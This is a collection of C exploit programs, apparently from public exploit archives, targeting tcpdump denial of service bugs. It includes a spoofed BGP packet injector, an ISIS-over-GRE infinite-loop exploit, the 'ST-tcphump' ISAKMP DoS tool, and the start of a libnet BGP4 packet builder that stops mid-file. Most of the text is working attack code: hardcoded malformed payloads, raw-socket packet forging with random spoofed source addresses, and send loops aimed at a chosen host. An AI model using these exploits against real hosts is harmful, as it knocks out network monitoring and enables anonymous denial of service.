 unsigned short res1:4,doff:4,fin:1,syn:1,
 rst:1,psh:1,ack:1,urg:1,ece:1,cwr:1;
#endif
 unsigned short window;
 unsigned short check;
 unsigned short urg_ptr;
};
struct sumh{
  unsigned int saddr;
  unsigned int daddr;
  unsigned char fill;
  unsigned char protocol;
  unsigned short len;
};

/* malformed BGP data. (the bug) */
static char payload[]=
 /* shortened method. (34 bytes) */
 "\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff"
 "\xff\xff\xff\xff\xff\xff\x00\x13\x02\x00"
 "\x01\x00\xff\x00\xff\x0e\x00\xff\x00\x01"
 "\x84\x00\x00\x00";
 /* original method, un-comment/swap if desired. (39 bytes) */
 /* "\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff" */
 /* "\xff\xff\xff\xff\xff\xff\x00\x13\x02\x00" */
 /* "\x01\x00\xff\x00\xff\x0e\x00\xff\x00\x01" */
 /* "\x84\x00\x00\x20\x00\x00\x00\x00\x00"; */

/* prototypes. (and sig_alarm) */
void bgp_connect(unsigned int);
void bgp_inject(unsigned int,unsigned int);
unsigned short in_cksum(unsigned short *,signed int);
unsigned int getip(char *);
void printe(char *,signed char);
void sig_alarm(){printe("alarm/timeout hit.",1);}

/* begin. */
int main(int argc,char **argv) {
 unsigned char nospoof=0;
 unsigned int amt=DFL_AMOUNT;
 unsigned int daddr=0,saddr=0;
 printf("[*] tcpdump[3.8.x]: (BGP) RT_ROUTING_INFO infinite loop "
 "DOS.\n[*] by: vade79/v9 v9@fakehalo.us (fakehalo/realhalo)\n\n");
 if(argc<2){
  printf("[*] syntax: %s <dst host> [src host(0=random)] [amount]\n",
  argv[0]);
  printf("[*] syntax: %s <dst host> nospoof\n",argv[0]);
  exit(1);
 }
 if(!(daddr=getip(argv[1])))
  printe("invalid destination host/ip.",1);
 if(argc>2){
  if(strstr(argv[2],"nospoof"))nospoof=1;
  else saddr=getip(argv[2]);
 }
 if(argc>3)amt=atoi(argv[3]);
 if(nospoof){
  printf("[*] target: %s\n",argv[1]);
  bgp_connect(daddr);
  printf("[*] done.\n");
 }
 else{
  if(!amt)printe("no packets?",1);
  printf("[*] destination\t: %s\n",argv[1]);
  printf("[*] source\t: %s\n",(saddr?argv[2]:"<random>"));
  printf("[*] amount\t: %u\n\n",amt);
  printf("[+] sending(packet = .): ");
  fflush(stdout);
  while(amt--){
   /* spice things up. */
   srandom(time(0)+amt);
   bgp_inject(daddr,saddr);
   printf(".");
   fflush(stdout);
   usleep(50000);
  }
  printf("\n\n[*] done.\n");
 }
 fflush(stdout);
 exit(0);
}
/* (non-spoofed) generic connection. (port 179 on the */
/* victim has to be open for this to work) */
void bgp_connect(unsigned int daddr){
 signed int sock;
 struct sockaddr_in s;
 sock=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
 s.sin_family=AF_INET;
 s.sin_port=htons(BGP_PORT);
 s.sin_addr.s_addr=daddr;
 printf("[*] attempting to connect...\n");
 signal(SIGALRM,sig_alarm);
 alarm(TIMEOUT);
 if(connect(sock,(struct sockaddr *)&s,sizeof(s)))
  printe("(non-spoofed) BGP connection failed.",1);
 alarm(0);
 printf("[*] successfully connected.\n");
 printf("[*] sending malformed BGP data. (%u bytes)\n",
 sizeof(payload)-1);
 usleep(500000);
 write(sock,payload,sizeof(payload));
 usleep(500000);
 printf("[*] closing connection.\n\n");
 close(sock);
 return;
}
/* (spoofed) generates and sends an unestablished (BGP) */
/* TCP(ACK,PUSH) or TCP(SYN) packet. */
void bgp_inject(unsigned int daddr,unsigned int saddr){
 signed int sock=0,on=1;
 unsigned int psize=0;
 char *p,*s;
 struct sockaddr_in sa;
 struct iph ip;
 struct tcph tcp;
 struct sumh sum;
 /* create raw (TCP) socket. */
 if((sock=socket(AF_INET,SOCK_RAW,IPPROTO_TCP))<0)
  printe("could not allocate raw socket.",1);
 /* allow (on some systems) for the user-supplied ip header. */
#ifdef IP_HDRINCL
 if(setsockopt(sock,IPPROTO_IP,IP_HDRINCL,(char *)&on,sizeof(on)))
  printe("could not set IP_HDRINCL socket option.",1);
#endif
 sa.sin_family=AF_INET;
 sa.sin_port=htons(BGP_PORT);
 sa.sin_addr.s_addr=daddr;
 psize=(sizeof(struct iph)+sizeof(struct tcph)+sizeof(payload)-1);
 memset(&ip,0,sizeof(struct iph));
 memset(&tcp,0,sizeof(struct tcph));
 /* values not filled = 0, from the memset() above. */
 ip.ihl=5;
 ip.version=4;
 ip.tot_len=htons(psize);
 ip.id=(random()%65535);
 ip.saddr=(saddr?saddr:random()%0xffffffff);
 ip.daddr=daddr;
 ip.ttl=(64*(random()%2+1));
 ip.protocol=IPPROTO_TCP;
 ip.frag_off=64;
 tcp.seq=(random()%0xffffffff+1);
 tcp.source=htons(random()%60000+1025);
 tcp.dest=sa.sin_port;
 /* passing BGP data as ip options for the syn packet method */
 /* doesn't work as tcpdump doesnt process it as BGP data. */
 tcp.doff=5;
#ifdef _USE_SYN
 tcp.syn=1;
 tcp.window=htons(65535);
#else
 tcp.ack=1;
 tcp.psh=1;
 tcp.ack_seq=(random()%0xffffffff+1);
 tcp.window=htons(4096*(random()%2+1));
#endif
 /* needed for (correct) checksums. */
 sum.saddr=ip.saddr;
 sum.daddr=ip.daddr;
 sum.fill=0;
 sum.protocol=ip.protocol;
 sum.len=htons(sizeof(struct tcph)+sizeof(payload)-1);
 /* make sum/calc buffer for the tcp checksum. (correct) */
 if(!(s=(char *)malloc(sizeof(struct sumh)+sizeof(struct tcph)
 +sizeof(payload)+1)))
  printe("malloc() failed.",1);
 memset(s,0,(sizeof(struct sumh)+sizeof(struct tcph)
 +sizeof(payload)+1));
 memcpy(s,&sum,sizeof(struct sumh));
 memcpy(s+sizeof(struct sumh),&tcp,sizeof(struct tcph));
 memcpy(s+sizeof(struct sumh)+sizeof(struct tcph),
 payload,sizeof(payload)-1);
 tcp.check=in_cksum((unsigned short *)s,
 sizeof(struct sumh)+sizeof(struct tcph)+sizeof(payload)-1);
 free(s);
 /* make sum/calc buffer for the ip checksum. (correct) */
 if(!(s=(char *)malloc(sizeof(struct iph)+1)))
  printe("malloc() failed.",1);
 memset(s,0,(sizeof(struct iph)+1));
 memcpy(s,&ip,sizeof(struct iph));
 ip.check=in_cksum((unsigned short *)s,sizeof(struct iph));
 free(s);
 /* put the packet together. */
 if(!(p=(char *)malloc(psize+1)))
  printe("malloc() failed.",1);
 memset(p,0,psize);
 memcpy(p,&ip,sizeof(struct iph));
 memcpy(p+sizeof(struct iph),&tcp,sizeof(struct tcph));
 memcpy(p+(sizeof(struct iph)+sizeof(struct tcph)),
 payload,sizeof(payload));
 /* send the malformed BGP packet. */
 if(sendto(sock,p,psize,0,(struct sockaddr *)&sa,
 sizeof(struct sockaddr))<psize)
  printe("failed to send forged BGP packet.",1);
 free(p);
 return;
}
/* standard method for creating TCP/IP checksums. */
unsigned short in_cksum(unsigned short *addr,signed int len){
 unsigned short answer=0;
 register unsigned short *w=addr;
 register int nleft=len,sum=0;
 while(nleft>1){
  sum+=*w++;
  nleft-=2;
 }
 if(nleft==1){
  *(unsigned char *)(&answer)=*(unsigned char *)w;
  sum+=answer;
 }
 sum=(sum>>16)+(sum&0xffff);
 sum+=(sum>>16);
 answer=~sum;
 return(answer);
}
/* gets the ip from a host/ip/numeric. */
unsigned int getip(char *host){
 struct hostent *t;
 unsigned int s=0;
 if((s=inet_addr(host))){
  if((t=gethostbyname(host)))
   memcpy((char *)&s,(char *)t->h_addr,sizeof(s));
 }
 if(s==-1)s=0;
 return(s);
}
/* all-purpose error/exit function. */
void printe(char *err,signed char e){
 printf("[!] %s\n",err);
 if(e)exit(e);
 return;
}

// milw0rm.com [2005-04-26]
/*[ tcpdump[3.8.x/3.9.1]: (ISIS) isis_print() infinite loop DOS. ]* 
 *                                                                *
 * by: vade79/v9 v9@fakehalo.us (fakehalo/realhalo)               *
 *                                                                *
 * compile:                                                       *
 *  gcc xtcpdump-isis-dos.c -o xtcpdump-isis-dos                  *
 *                                                                *
 * tcpdump homepage/URL:                                          *
 *  http://www.tcpdump.org                                        *
 *                                                                *
 * Tcpdump is a program that allows you to dump the traffic on a  *
 * network. It can be used to print out the headers of packets on *
 * a network interface that matches a given expression. You can   *
 * use this tool to track down network problems, to detect "ping  *
 * attacks" or to monitor the network activities.                 *
 *                                                                *
 * tcpdump(v3.9.1 and earlier versions) contains a remote denial  *
 * of service vulnerability in the form of a single (GRE) packet  *
 * causing an infinite loop.  the packet doesnt actually have to  *
 * be an GRE packet, as the function is used in isoclns_print()   *
 * which is used many places by tcpdump, however i went with GRE  *
 * because it was the first one that popped up.                   *
 *                                                                *
 * as this bug doesn't appear to be fixed in the new(3.9.x/CVS)   *
 * versions i'll elaborate on the problem.  the bug lies in       *
 * isis_print()(called by isoclns_print()) in the                 *
 * TLV_ISNEIGH_VARLEN portion of the code, be providing a zero    *
 * length causing an infinite loop.                               *
 *                                                                *
 * some versions of tcpdump(depending on the platform/OS) need no *
 * special command-line arguments to allow this to happen,        *
 * however most need the "-v" argument.                           *
 ******************************************************************/
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <signal.h>
#include <time.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <netdb.h>
#ifdef _USE_ARPA
#include <arpa/inet.h>
#endif

/* doesn't seem to be standardized, so... */
#if defined(__BYTE_ORDER) && !defined(BYTE_ORDER)
#define BYTE_ORDER __BYTE_ORDER
#endif
#if defined(__BIG_ENDIAN) && !defined(BIG_ENDIAN)
#define BIG_ENDIAN __BIG_ENDIAN
#endif
#if defined(BYTE_ORDER) && defined(BIG_ENDIAN)
#if BYTE_ORDER == BIG_ENDIAN
#define _USE_BIG_ENDIAN
#endif
#endif

#define DFL_AMOUNT 5

/* avoid platform-specific header madness. */
/* (just plucked out of header files) */
struct iph{
#ifdef _USE_BIG_ENDIAN
 unsigned char version:4,ihl:4;
#else
 unsigned char ihl:4,version:4;
#endif
 unsigned char tos;
 unsigned short tot_len;
 unsigned short id;
 unsigned short frag_off;
 unsigned char ttl;
 unsigned char protocol;
 unsigned short check;
 unsigned int saddr;
 unsigned int daddr;
};
struct greh{
#ifdef _USE_BIG_ENDIAN
  u_int8_t  check:1,routing:1,key:1,seq:1,strict:1,recur:3;
  u_int8_t  flags:5,version:3;
#else
  u_int8_t  recur:3,strict:1,seq:1,key:1,routing:1,check:1;
  u_int8_t  version:3,flags:5;
#endif
  u_int16_t protocol;
};
struct sumh{
  unsigned int saddr;
  unsigned int daddr;
  unsigned char fill;
  unsigned char protocol;
  unsigned short len;
};

/* malformed ISIS data. (the bug) */
static char payload[]=
 "\x83\x1b\x01\x06\x12\x01\xff\x07\xff\xff"
 "\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff"
 "\xff\xff\xff\xff\xff\xff\x01\x07\x00\x00";

/* prototypes. (and sig_alarm) */
void gre_spoof(unsigned int,unsigned int);
unsigned short in_cksum(unsigned short *,signed int);
unsigned int getip(char *);
void printe(char *,signed char);
void sig_alarm(){printe("alarm/timeout hit.",1);}

/* begin. */
int main(int argc,char **argv) {
 unsigned char nospoof=0;
 unsigned int amt=DFL_AMOUNT;
 unsigned int daddr=0,saddr=0;
 printf("[*] tcpdump[3.8.x/3.9.1]: (ISIS) isis_print() infinite loop "
 "DOS.\n[*] by: vade79/v9 v9@fakehalo.us (fakehalo/realhalo)\n\n");
 if(argc<2){
  printf("[*] syntax: %s <dst host> [src host(0=random)] [amount]\n",
  argv[0]);
  exit(1);
 }
 if(!(daddr=getip(argv[1])))
  printe("invalid destination host/ip.",1);
 if(argc>2)saddr=getip(argv[2]);
 if(argc>3)amt=atoi(argv[3]);
 if(!amt)printe("no packets?",1);
 printf("[*] destination\t: %s\n",argv[1]);
 if(!nospoof)
  printf("[*] source\t: %s\n",(saddr?argv[2]:"<random>"));
 printf("[*] amount\t: %u\n\n",amt);
 printf("[+] sending(packet = .): ");
 fflush(stdout);
 while(amt--){
  /* spice things up. */
  srandom(time(0)+amt);
  gre_spoof(daddr,saddr);
  printf(".");
  fflush(stdout);
  usleep(50000);
 }
 printf("\n\n[*] done.\n");
 fflush(stdout);
 exit(0);
}
/* (spoofed) generates and sends a (GRE) ip packet. */
void gre_spoof(unsigned int daddr,unsigned int saddr){
 signed int sock=0,on=1;
 unsigned int psize=0;
 char *p,*s;
 struct sockaddr_in sa;
 struct iph ip;
 struct greh gre;
 struct sumh sum;
 /* create raw (GRE) socket. */
 if((sock=socket(AF_INET,SOCK_RAW,IPPROTO_GRE))<0)
  printe("could not allocate raw socket.",1);
 /* allow (on some systems) for the user-supplied ip header. */
#ifdef IP_HDRINCL
 if(setsockopt(sock,IPPROTO_IP,IP_HDRINCL,(char *)&on,sizeof(on)))
  printe("could not set IP_HDRINCL socket option.",1);
#endif
 sa.sin_family=AF_INET;
 sa.sin_addr.s_addr=daddr;
 psize=(sizeof(struct iph)+sizeof(struct greh)+sizeof(payload)-1);
 memset(&ip,0,sizeof(struct iph));
 memset(&gre,0,sizeof(struct greh));
 /* values not filled = 0, from the memset() above. */
 ip.ihl=5;
 ip.version=4;
 ip.tot_len=htons(psize);
 ip.saddr=(saddr?saddr:random()%0xffffffff);
 ip.daddr=daddr;
 ip.ttl=(64*(random()%2+1));
 ip.protocol=IPPROTO_GRE;
 ip.frag_off=64;
 /* OSI. (to isoclns_print(), then to isis_print()) */
 gre.protocol=htons(254);
 /* needed for the ip checksum. */
 sum.saddr=ip.saddr;
 sum.daddr=ip.daddr;
 sum.fill=0;
 sum.protocol=ip.protocol;
 sum.len=htons(sizeof(struct greh)+sizeof(payload)-1);
 /* make sum/calc buffer for the ip checksum. (correct) */
 if(!(s=(char *)malloc(sizeof(struct iph)+1)))
  printe("malloc() failed.",1);
 memset(s,0,(sizeof(struct iph)+1));
 memcpy(s,&ip,sizeof(struct iph));
 ip.check=in_cksum((unsigned short *)s,sizeof(struct iph));
 free(s);
 /* put the packet together. */
 if(!(p=(char *)malloc(psize+1)))
  printe("malloc() failed.",1);
 memset(p,0,psize);
 memcpy(p,&ip,sizeof(struct iph));
 memcpy(p+sizeof(struct iph),&gre,sizeof(struct greh));
 memcpy(p+(sizeof(struct iph)+sizeof(struct greh)),
 payload,sizeof(payload));
 /* send the malformed (GRE) packet. (ISIS data) */
 if(sendto(sock,p,psize,0,(struct sockaddr *)&sa,
 sizeof(struct sockaddr))<psize)
  printe("failed to send forged GRE packet.",1);
 free(p);
 return;
}
/* standard method for creating TCP/IP checksums. */
unsigned short in_cksum(unsigned short *addr,signed int len){
 unsigned short answer=0;
 register unsigned short *w=addr;
 register int nleft=len,sum=0;
 while(nleft>1){
  sum+=*w++;
  nleft-=2;
 }
 if(nleft==1){
  *(unsigned char *)(&answer)=*(unsigned char *)w;
  sum+=answer;
 }
 sum=(sum>>16)+(sum&0xffff);
 sum+=(sum>>16);
 answer=~sum;
 return(answer);
}
/* gets the ip from a host/ip/numeric. */
unsigned int getip(char *host){
 struct hostent *t;
 unsigned int s=0;
 if((s=inet_addr(host))){
  if((t=gethostbyname(host)))
   memcpy((char *)&s,(char *)t->h_addr,sizeof(s));
 }
 if(s==-1)s=0;
 return(s);
}
/* all-purpose error/exit function. */
void printe(char *err,signed char e){
 printf("[!] %s\n",err);
 if(e)exit(e);
 return;
}

// milw0rm.com [2005-04-26]
source: http://www.securityfocus.com/bid/6974/info

It has been reported that tcpdump is vulnerable to a denial of service when some packet types are received. By sending a maliciously formatted packet to a system using a vulnerable version of tcpdump, it is possible for a remote user to cause tcpdump to ignore network traffic from the time the packet is received until the application is terminated and restarted.

/*
 * ST-tcphump.c -- tcpdump ISAKMP denial of service attack
 * 	The Salvia Twist
 * 	01/03/03
 * 
 * "A vulnerability exists in the parsing of ISAKMP packets (UDP port 500)
 *  that allows an attacker to force TCPDUMP into an infinite loop upon
 *  receipt of a specially crafted packet."
 *
 * The fault really lies in isakmp_sub0_print() not isakmp_sub_print().
 * 
 * Sometimes spoofed packets don't reach their destination, so we have support 
 * for non-spoofed packets.
 * 
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <linux/types.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <sys/socket.h>
#include <unistd.h>

#define ISAKMPGEN_SIZE	sizeof(struct isakmpgen)
#define ISAKMPHEAD_SIZE sizeof(struct isakmphdr)
#define PSDHEAD_SIZE	sizeof(struct pseudohdr)
#define UDPHEAD_SIZE	sizeof(struct udphdr)
#define IPHEAD_SIZE	sizeof(struct iphdr)
#define PORT		500

struct isakmpgen * isakmpg(void);
struct isakmphdr * isakmph(void);
struct udphdr * udph(void);
struct iphdr * iph(void);
__u16 cksum(__u16 *buf, int nbytes);
void get_interface(void);
void usage(void);

struct isakmpgen {
	__u8 np;
	__u8 reserved;
	__u16 length;
};

struct isakmphdr {
	__u8 i_ck[8];
	__u8 r_ck[8];
	__u8 np;
	__u8 vers;
	__u8 etype;
	__u8 flags;
	__u8 msgid[4];
	__u32 len;
};

struct pseudohdr {
	__u32 saddr;
	__u32 daddr;
	__u8 zero;
	__u8 protocol;
	__u16 length;
};

struct sockaddr_in saddr;
struct sockaddr_in local;
int spoof;

int main(int argc, char *argv[]) {
	char *packet = malloc(4096);
	char *pseudo = malloc(4096);
	struct isakmpgen *isakmpgen = malloc(ISAKMPGEN_SIZE);
	struct isakmphdr *isakmp = malloc(ISAKMPHEAD_SIZE);
	struct pseudohdr *phdr = malloc(PSDHEAD_SIZE);
	struct udphdr	*udp = malloc(UDPHEAD_SIZE);
	struct iphdr	*ip = malloc(IPHEAD_SIZE);
	int sock = socket(PF_INET, SOCK_RAW, IPPROTO_TCP);
	int one = 1;
	const int *val = &one;
	
	printf("ST-tcphump tcpdump ISAKMP denial of service\n");
	printf("	The Salvia Twist\n");
	
	if(argc < 2) {
		usage();
		exit(1);
	}
	
	if(!strcmp(argv[1], "-s"))
		spoof = 0;
	else {
		spoof = 1;
		get_interface();
	}
			
	if(!spoof && argc < 3) {
		usage();
		exit(1);
	}
	
	bzero(packet, sizeof(packet));
	bzero(pseudo, sizeof(pseudo));
	srand(time(NULL));
	
	saddr.sin_family = AF_INET;
	saddr.sin_port = htons(PORT);
	
	if(spoof)
		saddr.sin_addr.s_addr = inet_addr(argv[1]);
	else
		saddr.sin_addr.s_addr = inet_addr(argv[2]);
	
	setsockopt(sock, IPPROTO_IP, IP_HDRINCL, val, sizeof(one));
	
	ip = iph();
	udp = udph();
	isakmp = isakmph();
	isakmpgen = isakmpg();
	
	memcpy(&phdr->saddr, &ip->saddr, 4);
	memcpy(&phdr->daddr, &ip->daddr, 4);
	phdr->protocol = 17;
	phdr->length = htons(UDPHEAD_SIZE + ISAKMPHEAD_SIZE + ISAKMPGEN_SIZE);
	
	memcpy(pseudo, phdr, PSDHEAD_SIZE);
	memcpy(pseudo + PSDHEAD_SIZE, udp, UDPHEAD_SIZE);
	memcpy(pseudo + PSDHEAD_SIZE + UDPHEAD_SIZE, isakmp, ISAKMPHEAD_SIZE);
	memcpy(pseudo + PSDHEAD_SIZE + UDPHEAD_SIZE + ISAKMPHEAD_SIZE,
			isakmpgen, ISAKMPGEN_SIZE);
	
	udp->check = cksum((u_short*) pseudo, PSDHEAD_SIZE + UDPHEAD_SIZE +
			ISAKMPHEAD_SIZE + ISAKMPGEN_SIZE);
	
	memcpy(packet, ip, IPHEAD_SIZE);
	memcpy(packet + IPHEAD_SIZE, udp, UDPHEAD_SIZE);
	memcpy(packet + IPHEAD_SIZE + UDPHEAD_SIZE, isakmp, ISAKMPHEAD_SIZE);
	memcpy(packet + IPHEAD_SIZE + UDPHEAD_SIZE + ISAKMPHEAD_SIZE,
			isakmpgen, ISAKMPGEN_SIZE);
		
	ip->check = cksum((u_short*) packet, ip->tot_len >> 1);
	memcpy(packet, ip, IPHEAD_SIZE);

	if(sendto(sock, packet, ip->tot_len, 0, (struct sockaddr *) &saddr,
				sizeof(saddr)) < 0) {
		printf("sendto error\n");
		exit(1);
	}
	
	printf("Packet sent.\n");
	
	return 0;
}

void usage(void) {
	printf("\nUsage: ST-tcphump -s <target addr>\n");
	printf("\t-s\tdon't spoof source address\n");
}

__u16 cksum(__u16 *buf, int nbytes) {
	__u32 sum;
	__u16 oddbyte;

	sum = 0;
	while(nbytes > 1) {
		sum += *buf++;
		nbytes -= 2;
	}

	if(nbytes == 1) {
		oddbyte = 0;
		*((__u16 *) &oddbyte) = *(__u8 *) buf;
		sum += oddbyte;
	}

	sum = (sum >> 16) + (sum & 0xffff);
	sum += (sum >> 16);

	return (__u16) ~sum;
}

struct isakmpgen * isakmpg(void) {
	struct isakmpgen *isakmpg = malloc(ISAKMPGEN_SIZE);

	bzero(isakmpg, ISAKMPGEN_SIZE);
	isakmpg->np = 69;
}

struct isakmphdr * isakmph(void) {
	struct isakmphdr *isakmph = malloc(ISAKMPHEAD_SIZE);
	int i;
	
	bzero(isakmph, ISAKMPHEAD_SIZE);
	for(i = 0; i < 8; i++) {
		isakmph->i_ck[i] = rand() % 256;
		isakmph->r_ck[i] = rand() % 256;
	}
	for(i = 0; i < 4; i++)
		isakmph->msgid[i] = rand() % 256;
	isakmph->vers = 0x8 << 4 | 0x9;
	isakmph->np = 69;
	isakmph->etype = 2;
	isakmph->len = htonl(ISAKMPHEAD_SIZE + ISAKMPGEN_SIZE);
}

struct udphdr * udph(void) {
	struct udphdr *udph = malloc(UDPHEAD_SIZE);

	udph->source = htons(PORT);//htons(1024 + (rand() % 2003));
	udph->dest = htons(PORT);
	udph->len = UDPHEAD_SIZE + ISAKMPHEAD_SIZE + ISAKMPGEN_SIZE;
	udph->check = 0;
}

struct iphdr * iph(void) {
	struct iphdr *iph = malloc(IPHEAD_SIZE);

	iph->ihl = 5;
	iph->version = 4;
	iph->tos = 0;
	iph->tot_len = IPHEAD_SIZE + UDPHEAD_SIZE + ISAKMPHEAD_SIZE + 
		ISAKMPGEN_SIZE;
	iph->id = htons(rand());
	iph->frag_off = 0;
	iph->ttl = 225;
	iph->protocol = 17;
	iph->check = 0;

	if(spoof) {
		iph->saddr = saddr.sin_addr.s_addr;
	}
	else
		iph->saddr = local.sin_addr.s_addr;
	
	iph->daddr = saddr.sin_addr.s_addr;
	
	return iph;
}

/* thanks hping2 */
void get_interface(void) {
	int sockr, len, on = 1;
	struct sockaddr_in dest;
	struct sockaddr_in iface;

	memset(&iface, 0, sizeof(iface));
	memcpy(&dest, &saddr, sizeof(struct sockaddr_in));
	dest.sin_port = htons(11111);

	sockr = socket(AF_INET, SOCK_DGRAM, 0);

	if(setsockopt(sockr, SOL_SOCKET, SO_BROADCAST, &on, sizeof(on)) == -1) {
		printf("getsockopt error\n");
		exit(1);
	}

	if(connect(sockr, (struct sockaddr *)&dest,
				sizeof(struct sockaddr_in)) == -1) {
		printf("connect error\n");
		exit(1);
	}

	len = sizeof(iface);
	if(getsockname(sockr, (struct sockaddr *)&iface, &len) == -1) {
		printf("getsockname error\n");
		exit(1);
	}
	
	close(sockr);
	memcpy(&local, &iface, sizeof(struct sockaddr_in));
	return;
}


/*
* 2005-05-31: Modified by simon@FreeBSD.org to test tcpdump infinite
* loop vulnerability.
*
* libnet 1.1
* Build a BGP4 update message with what you want as payload
*
* Copyright (c) 2003 Fr d ric Raynal <pappy at security-labs organization>
* All rights reserved.
*
* Examples:
*
* empty BGP UPDATE message:
*
* # ./bgp4_update -s 1.1.1.1 -d 2.2.2.2
* libnet 1.1 packet shaping: BGP4 update + payload[raw]
* Wrote 63 byte TCP packet; check the wire.
*
* 13:44:29.216135 1.1.1.1.26214 > 2.2.2.2.179: S [tcp sum ok]
* 16843009:16843032(23) win 32767: BGP (ttl 64, id 242, len 63)
* 0x0000 4500 003f 00f2 0000 4006 73c2 0101 0101 E..?....@.s.....
* 0x0010 0202 0202 6666 00b3 0101 0101 0202 0202 ....ff..........
* 0x0020 5002 7fff b288 0000 0101 0101 0101 0101 P...............
* 0x0030 0101 0101 0101 0101 0017 0200 0000 00 ...............
*
*
* BGP UPDATE with Path Attributes and Unfeasible Routes Length
*
* # ./bgp4_update -s 1.1.1.1 -d 2.2.2.2 -a `printf "\x01\x02\x03"` -A 3 -W 13
* libnet 1.1 packet shaping: BGP4 update + payload[raw]
* Wrote 79 byte TCP packet; check the wire.
*
* 13:45:59.579901 1.1.1.1.26214 > 2.2.2.2.179: S [tcp sum ok]
* 16843009:16843048(39) win 32767: BGP (ttl 64, id 242, len 79)
* 0x0000 4500 004f 00f2 0000 4006 73b2 0101 0101 E..O....@.s.....
* 0x0010 0202 0202 6666 00b3 0101 0101 0202 0202 ....ff..........
* 0x0020 5002 7fff 199b 0000 0101 0101 0101 0101 P...............
* 0x0030 0101 0101 0101 0101 0027 0200 0d41 4141 .........'...AAA
* 0x0040 4141 4141 4141 4141 4141 0003 0102 03 AAAAAAAAAA.....
*
*
* BGP UPDATE with Reachability Information
*
* # ./bgp4_update -s 1.1.1.1 -d 2.2.2.2 -I 7
* libnet 1.1 packet shaping: BGP4 update + payload[raw]
* Wrote 70 byte TCP packet; check the wire.
*
* 13:49:02.829225 1.1.1.1.26214 > 2.2.2.2.179: S [tcp sum ok]
* 16843009:16843039(30) win 32767: BGP (ttl 64, id 242, len 70)
* 0x0000 4500 0046 00f2 0000 4006 73bb 0101 0101 E..F....@.s.....
* 0x0010 0202 0202 6666 00b3 0101 0101 0202 0202 ....ff..........
* 0x0020 5002 7fff e86d 0000 0101 0101 0101 0101 P....m..........
* 0x0030 0101 0101 0101 0101 001e 0200 0000 0043 ...............C
* 0x0040 4343 4343 4343 CCCCCC
*
*
* Redistribution and use in source and binary forms, with or without
* modification, are permitted provided that the following conditions
* are met:
* 1. Redistributions of source code must retain the above copyright
* notice, this list of conditions and the following disclaimer.
* 2. Redistributions in binary form must reproduce the above copyright
* notice, this list of conditions and the following disclaimer in the
* documentation and/or other materials provided with the distribution.
*
* THIS SOFTWARE IS PROVIDED BY THE AUTHOR AND CONTRIBUTORS ``AS IS'' AND
* ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
* IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
* ARE DISCLAIMED. IN NO EVENT SHALL THE AUTHOR OR CONTRIBUTORS BE LIABLE
* FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
* DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS
* OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
* HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
* LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY
* OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF
* SUCH DAMAGE.
*
*/

/* #if (HAVE_CONFIG_H) */
/* #include "../include/config.h" */
/* #endif */
/* #include "./libnet_test.h" */
#include <libnet.h>

void
usage(char *name);


#define set_ptr_and_size(ptr, size, val, flag) \
if (size && !ptr) \
{ \
ptr = (u_char *)malloc(size); \
if (!ptr) \
{ \
printf("memory allocation failed (%u bytes requested)\n", size); \
goto bad; \
} \
memset(ptr, val, size); \
flag = 1; \
} \
\
if (ptr && !size) \
{ \
size = strlen(ptr); \
}



int
main(int argc, char *argv[])
{
int c;
libnet_t *l;
u_long src_ip, dst_ip, length;
libnet_ptag_t t = 0;
char errbuf[LIBNET_ERRBUF_SIZE];
int pp;
u_char *payload = NULL;
u_long payload_s = 0;
u_char marker[LIBNET_BGP4_MARKER_SIZE];

u_short u_rt_l = 0;
u_char *withdraw_rt = NULL;
char flag_w = 0;
u_short attr_l = 0;
u_char *attr = NULL;
char flag_a = 0;
u_short info_l = 0;
u_char *info = NULL;
char flag_i = 0;

printf("libnet 1.1 packet shaping: BGP4 update + payload[raw]\n");

/*
* Initialize the library. Root priviledges are required.
*/
l = libnet_init(
LIBNET_RAW4, /* injection type */
NULL, /* network interface */
errbuf); /* error buffer */

if (l == NULL)
{
fprintf(stderr, "libnet_init() failed: %s", errbuf);
exit(EXIT_FAILURE);
}

src_ip = 0;
dst_ip = 0;
memset(marker, 0x1, LIBNET_BGP4_MARKER_SIZE);
memset(marker, 0xff, LIBNET_BGP4_MARKER_SIZE);

while ((c = getopt(argc, argv, "d:s:t:m:p:w:W:a:A:i:I:")) != EOF)
{
switch (c)
{
/*
* We expect the input to be of the form `ip.ip.ip.ip.port`. We
* point cp to the last dot of the IP address/port string and
* then seperate them with a NULL byte. The optarg now points to
* just the IP address, and cp points to the port.
*/
case 'd':
if ((dst_ip = libnet_name2addr4(l, optarg, LIBNET_RESOLVE)) == -1)
{
fprintf(stderr, "Bad destination IP address: %s\n", optarg);
exit(EXIT_FAILURE);
}
break;

case 's':
if ((src_ip = libnet_name2addr4(l, optarg, LIBNET_RESOLVE)) == -1)
{
fprintf(stderr, "Bad source IP address: %s\n", optarg);
exit(EXIT_FAILURE);
}
break;

case 'p':
payload = optarg;
payload_s = strlen(payload);
break;

case 'w':
withdraw_rt = optarg;
break;

case 'W':
u_rt_l = atoi(optarg);
break;

case 'a':
attr = optarg;
break;

case 'A':
attr_l = atoi(optarg);
break;

case 'i':
info = optarg;
break;

case 'I':
info_l = atoi(optarg);
break;

default:
exit(EXIT_FAILURE);
}
}

if (!src_ip || !dst_ip)
{
usage(argv[0]);
goto bad;
}

set_ptr_and_size(withdraw_rt, u_rt_l, 0x41, flag_w);
set_ptr_and_size(attr, attr_l, 0x42, flag_a);
set_ptr_and_size(info, info_l, 0x43, flag_i);

